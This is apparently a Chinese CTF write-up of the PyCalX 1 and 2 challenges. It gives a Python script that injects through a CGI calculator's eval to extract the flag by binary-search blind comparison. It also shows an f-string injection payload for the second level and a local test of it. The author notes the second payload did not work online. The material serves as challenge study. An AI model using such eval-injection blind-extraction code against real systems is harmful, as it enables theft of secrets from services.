---
title: PyCalX 1和2
date: 2020-04-08
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---
# PyCalX 1和2

## 分析

首先是1,审计源码,souce可控,模拟sql注入改变操作

<!-- more -->

## exp

```
import requests
import time


url = 'http://44f679f2-1772-4584-b810-90c98139efc8.node3.buuoj.cn/'
flag = 'flag{'
url = url + "cgi-bin/pycalx.py"
while True:
    high = 127
    low = 1
    mid = (high + low) // 2
    while high > low:
        tmp = flag + chr(mid)
        data = {
            'value1': 'a',
            'op': '+\'',
            'value2': 'and FLAG>source#',
            'source': tmp
        }
        data2={
            'value1':'Tru',
            'op':'+f',
            'value2':'{101 if FLAG>source else 102:c}',
            'source':tmp
        }
        r = requests.get(url, data)
        print(chr(mid), end="")
        if r.status_code == 200:
            if 'True' in r.text:
                low = mid + 1
            else:
                high = mid
            mid = (high + low) // 2
        else:
            time.sleep(1)
    flag += chr(mid-1)
    print(" | flag="+flag)
    if "}" in flag:
        break
print("flag="+flag)
```

## 分析

然后是2,进一步过滤了`''`所以利用python3的`F-strings`

```
'value1':'Tru',
'op':'+f',
'value2':'{101 if FLAG>source else 102:c}',
'source':'flag{a'
```

利用python3.6以后的特性`f'{中间可以加表达式}'`,当source为FLAG中字符时输出为Tru+101:c(就是字符e)组合成True,表示结果为false时输出Truf,再print会触发异常然后就会输出Invalid

然后就可以改变表达式来盲注,但是最终并没有复现出来

线上测试都为Invalid

本地测试

```
FLAG = "flag{test}"
source = "fla"
try:
    result = str(eval('Tru'+f'{101 if FLAG>source else 102:c}'))
    if result.isdigit() or result == 'True' or result == 'False':
        print(result)
    else:
        print("Invalid")  # Sorry we don't support output as a string due to security issue.
        print(1)
except:
    print("Invalid")
    print(2)
#输出结果为`True`
#当source="flb"时输出为
#Invalid
#2
```